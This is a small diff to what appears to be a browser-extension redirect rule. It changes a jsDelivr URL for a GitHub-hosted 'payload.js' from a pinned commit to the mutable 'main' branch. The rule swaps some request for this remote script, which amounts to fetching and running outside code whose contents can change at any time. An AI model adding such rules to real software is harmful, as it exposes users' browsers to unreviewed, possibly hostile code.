@@ -4,7 +4,7 @@
     "action": {
       "type": "redirect",
       "redirect": {
-        "url": "https://cdn.jsdelivr.net/gh/crx007-web/JUICE@3ee267f2da5d0b181313f7b77c6138c5970b48f0/payload.js"
+        "url": "https://cdn.jsdelivr.net/gh/crx007-web/JUICE@main/payload.js"
       }
     },
     "condition": {
